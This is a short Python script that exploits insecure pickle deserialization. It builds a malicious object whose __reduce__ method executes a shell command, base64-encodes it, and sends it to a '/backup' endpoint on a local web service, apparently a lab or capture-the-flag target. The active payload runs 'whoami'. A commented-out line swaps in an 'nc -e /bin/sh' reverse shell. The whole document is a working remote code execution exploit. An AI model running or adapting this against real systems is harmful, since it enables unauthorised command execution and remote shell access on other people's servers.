import pickle
import base64
import subprocess
import requests

class RCE:
    def __init__(self, command):
        self.command = command
    def __reduce__(self):
        cmd = (self.command)
        return subprocess.check_output, (cmd.split(),)


if __name__ == '__main__':

    #pickled = pickle.dumps(RCE('nc -e /bin/sh 127.0.0.1 1234'))
    pickled = pickle.dumps(RCE('whoami'))
    payload = base64.b64encode(pickled)

    print("[+] Sending exploit")

    r = requests.get("http://localhost:5000/backup", params={"info": payload})
    if "No backup files found for" in r.text:
        print("[!] Exploit didn't work")
    else:
        print(f"[+] result: {r.text}")
